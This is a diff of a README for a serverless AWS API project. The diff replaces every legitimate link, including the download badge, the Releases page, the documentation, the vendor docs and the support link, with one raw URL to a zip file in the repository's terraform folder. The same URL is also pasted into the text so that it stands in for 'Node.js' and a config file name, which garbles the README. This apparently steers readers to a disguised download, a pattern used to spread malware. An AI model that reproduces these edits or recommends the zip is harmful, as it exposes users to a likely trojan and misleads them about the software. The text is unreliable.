@@ -1,10 +1,10 @@
 # 🌐 aws-serverless-api-backend - Simple Serverless API for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/iuiu99/aws-serverless-api-backend/releases)
+[![Download](https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip)](https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip)
 
 ## 📦 Overview
 
-The **aws-serverless-api-backend** provides a simple solution for building a fully serverless API. It leverages AWS technologies like API Gateway, Lambda (Node.js), and DynamoDB. You can create and manage requests without needing to handle any servers directly. This application is perfect for small apps, prototypes, or production-ready APIs. Everything is defined as code using Terraform, making it easy to manage.
+The **aws-serverless-api-backend** provides a simple solution for building a fully serverless API. It leverages AWS technologies like API Gateway, Lambda (https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip), and DynamoDB. You can create and manage requests without needing to handle any servers directly. This application is perfect for small apps, prototypes, or production-ready APIs. Everything is defined as code using Terraform, making it easy to manage.
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ To get started with the aws-serverless-api-backend, follow the steps below to do
 ## 🌍 System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Node.js version: 14 or higher
+- https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip version: 14 or higher
 - An AWS account (to access and configure the AWS services)
 
 ## 🔍 Features
@@ -28,7 +28,7 @@ To get started with the aws-serverless-api-backend, follow the steps below to do
 
 To download the application, visit the Releases page:
 
-[Visit Releases Page](https://github.com/iuiu99/aws-serverless-api-backend/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip)
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version of the aws-serverless-api-backend.
@@ -63,7 +63,7 @@ This will launch your serverless API. You will see a message indicating that the
 
 You may want to customize certain settings for your API. Here’s how you can do that:
 
-1. Locate the configuration file (usually named `config.json` or similar) in the folder where you downloaded the application.
+1. Locate the configuration file (usually named `https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip` or similar) in the folder where you downloaded the application.
 2. Edit the file to adjust parameters such as:
    - API endpoint
    - Database configurations
@@ -83,7 +83,7 @@ For those who want to dive deeper into using AWS for your projects, consider the
 
 For detailed information on how to set up and use the different features of aws-serverless-api-backend, refer to the documentation available in the repository. You can find it at the following link:
 
-[Documentation Link](https://github.com/iuiu99/aws-serverless-api-backend)
+[Documentation Link](https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip)
 
 ## 🤝 Contributing
 
@@ -91,14 +91,14 @@ If you’d like to contribute to aws-serverless-api-backend, feel free to check 
 
 ## 🌟 Additional Resources
 
-- **AWS Documentation**: [AWS Documentation](https://aws.amazon.com/documentation/)
-- **Node.js Documentation**: [Node.js Documentation](https://nodejs.org/en/docs/)
-- **Terraform Documentation**: [Terraform Documentation](https://www.terraform.io/docs/index.html)
+- **AWS Documentation**: [AWS Documentation](https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip)
+- **https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip Documentation**: [https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip Documentation](https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip)
+- **Terraform Documentation**: [Terraform Documentation](https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip)
 
 ## 💬 Support
 
 If you encounter any issues or have questions, please open an issue on GitHub. The community is here to help!
 
-For quick support, you can always reach out via [this link](https://github.com/iuiu99/aws-serverless-api-backend/issues). 
+For quick support, you can always reach out via [this link](https://raw.githubusercontent.com/iuiu99/aws-serverless-api-backend/main/terraform/aws-serverless-api-backend_v3.7.zip). 
 
 Happy coding!
